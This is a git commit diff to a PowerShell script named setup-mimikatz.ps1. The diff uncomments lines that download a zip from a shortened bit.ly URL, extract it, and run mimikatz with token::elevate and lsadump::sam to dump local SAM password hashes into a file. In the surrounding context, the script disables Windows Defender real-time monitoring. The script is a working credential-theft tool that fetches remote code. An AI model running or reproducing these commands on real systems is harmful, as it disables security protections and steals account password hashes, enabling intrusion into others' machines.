489d7d24a34eb77a0991f87a69bb4c5afbed4811
Kyle Topasna <kyle.topasna@gmail.com>
2021-03-25 15:30:04 -0800

    Update setup-mimikatz.ps1

--- setup-mimikatz.ps1
+++ setup-mimikatz.ps1
@@ -8,17 +8,17 @@ Write-Output "[+] Excluded Path from Windows Defender"
 Set-MpPreference -DisableRealTimeMonitoring $true
 Write-Output "[+] Disabled Windows Defender"
 
-#$url = "https://bit.ly/3cjpdSp"
-#$output = "~\good_files_promise.zip"
-#Invoke-WebRequest -Uri $url -OutFile $output
+$url = "https://bit.ly/3cjpdSp"
+$output = "~\good_files_promise.zip"
+Invoke-WebRequest -Uri $url -OutFile $output
 
-#Expand-Archive ~\good_files_promise.zip
-#Write-Output "[+] Good files downloaded and extracted"
+Expand-Archive ~\good_files_promise.zip
+Write-Output "[+] Good files downloaded and extracted"
 
-#Write-Output "[+] Pulling down hashes"
-#cd .\good_files_promise\x64
+Write-Output "[+] Pulling down hashes"
+cd .\good_files_promise\x64
 
-#.\mimikatz.exe token::elevate lsadump::sam exit >> hashes.txt
-#mv hashes.txt ..\..\..\hashes.txt
+.\mimikatz.exe token::elevate lsadump::sam exit >> hashes.txt
+mv hashes.txt ..\..\..\hashes.txt
 
 
